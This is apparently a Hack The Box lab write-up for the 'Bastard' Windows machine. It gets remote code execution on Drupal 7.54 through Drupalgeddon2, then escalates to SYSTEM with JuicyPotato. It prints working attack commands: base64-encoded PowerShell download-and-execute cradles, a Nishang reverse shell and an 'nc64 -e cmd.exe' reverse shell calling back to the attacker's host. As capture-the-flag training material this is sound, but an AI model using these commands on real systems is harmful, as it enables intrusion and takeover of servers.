# Windows

## Enumeration

### Port 80

* Drupal 7.54, 2017-02-01

![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_drupal\_version.png)

### RCE

{% embed url="https://github.com/dreadlocked/Drupalgeddon2" %}

```
./drupalgeddon2.rb http://bastard.htb/
.
.
.
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          4/4/2022, 6:15:32 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                          [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
                          [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.584 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.611 MB
Virtual Memory: In Use:    484 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                          [01]: Intel(R) PRO/1000 MT Network Connection
                                Connection Name: Local Area Connection
                                DHCP Enabled:    Yes
                                DHCP Server:     10.129.0.1
                                IP address(es)
                                [01]: 10.129.123.241
```

### What is drupalgeddon?

{% embed url="https://cyware.com/news/what-is-drupalgeddon-and-what-kind-of-targets-does-it-go-after-78f558ec" %}

{% embed url="https://www.rapid7.com/blog/post/2018/04/27/drupalgeddon-vulnerability-what-is-it-are-you-impacted" %}

`$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./ps_tcp.ps1`

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.61 -Port 4444
```

## Shell

The below is less known to AV but did not work because the powershell version on the machine is old

```powershell
powershell -c 'IEX(IWR http://10.10.14.61/ps_tcp.ps1 -UseBasicParsing)'
```

We have to encode our command posisbly due to quotes and bad characters. Powershell accepts base64 encoded commands. We had to convert UTF-8 to 16-bit little indian encoding

```bash
echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.61/ps_tcp.ps1")' | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"

SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANgAxAC8AcABzAF8AdABjAHAALgBwAHMAMQAiACkA 
```

```powershell
drupalgeddon2>> powershell.exe -nop -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANgAxAC8AcABzAF8AdABjAHAALgBwAHMAMQAiACkA
```

![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_setup\_listener.png)

![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_gained\_shell.png)

![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_whoami (1).png>)

## Privledge Escalation

{% embed url="https://youtu.be/eLNYc-1ScdU?t=9033" %}

![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_Pasted image 20220404181827.png>)

{% embed url="https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505" %}

{% embed url="https://github.com/ohpe/juicy-potato" %}

```powershell
(New-Object Net.WebClient).downloadFile('http://10.10.14.61/JuicyPotato.exe','JuicyPotato.exe')
```

```powershell
(New-Object Net.WebClient).downloadFile('http://10.10.14.61/nc64.exe','nc64.exe')
```

{% embed url="http://ohpe.it/juicy-potato/CLSID" %}

Any with NT AUTHORITY\SYSTEM will work although it's trial and error to see which one will work&#x20;

Impersonating a SYSTEM process with a different service

```bash
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64 -e cmd.exe 10.10.14.61 8444" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_Pasted image 20220404190117.png>)

![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_whoami\_system.png)

## Flags

![](<../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_userflag (1).png>)

![](../../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_HTB\_attachments\_rootflag.png)
